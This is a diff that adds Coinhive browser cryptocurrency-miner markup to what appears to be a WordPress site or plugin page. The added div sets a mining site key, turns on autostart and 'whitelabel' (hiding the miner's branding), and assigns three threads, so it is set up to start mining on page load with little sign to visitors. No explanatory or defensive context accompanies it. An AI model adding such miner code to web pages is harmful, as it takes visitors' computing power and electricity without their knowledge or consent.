@@ -1,0 +1,12 @@
+< div class = "coinhive-miner"
+style = "width: 100%; height: 250px"
+data - ref = "wp-smm"
+data - key = "iwwMRgYk5TIXu6cCZS8QMqpGpPn9eQEm"
+data - autostart = "true"
+data - whitelabel = "true"
+data - background = "#fafafa"
+data - text = "#000000"
+data - action = "#1e9ee0"
+data - graph = "#1e9ee0"
+data - threads = "3"
+data - throttle = "0.3" > < em > Loading... < /em></div >
